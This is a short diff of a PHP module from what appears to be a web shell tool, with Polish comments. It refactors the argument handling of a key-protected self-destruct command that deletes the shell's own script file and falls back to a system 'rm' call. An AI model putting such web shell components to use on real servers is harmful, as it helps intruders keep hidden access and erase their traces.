@@ -93,7 +93,7 @@ class ModuleDestroy extends ModuleAbstract
 	}
 
 	/**
-	 * Wywolanie modulu
+	 * Wywalenie w kosmos
 	 *
 	 * @access public
 	 * @return string
@@ -103,14 +103,17 @@ class ModuleDestroy extends ModuleAbstract
 		/**
 		 * Help
 		 */
-		if( $this -> oShell -> iArgc === 0 )
+		if( $this -> oShell -> getArgs() -> getNumberOfParams() === 0 )
 		{
 			return $this -> getHelp();
 		}
 
-		if( ( $this -> oShell -> aArgv[0] === $this -> sKey ) )
+		$sKey = $this -> oShell -> getargs() -> getParam( 0 );
+		$sFinalKey = $this -> oShell -> getargs() -> getParam( 1 );
+
+		if( ( $sKey === $this -> sKey ) )
 		{
-			if( isset( $this -> oShell -> aArgv[1] ) && ( $this -> oShell -> aArgv[1] === $this -> sFinalKey ) )
+			if( $sFinalKey === $this -> sFinalKey )
 			{
 				$sFilePath = Request::getServer( 'SCRIPT_FILENAME' );
 
@@ -119,7 +122,10 @@ class ModuleDestroy extends ModuleAbstract
 				 */
 				if( ! unlink( $sFilePath ) )
 				{
-					$this -> oShell -> getCommandSystem( sprintf( 'rm %s', $sFilePath ) );
+					if( $this -> oShell -> isExecutable() )
+					{
+						$this -> oShell -> getCommandSystem( sprintf( 'rm %s', $sFilePath ) );
+					}
 				}
 
 				return sprintf( 'Shell %szostał usunięty', ( ! is_file( $sFilePath ) ? NULL : 'nie ' ) );
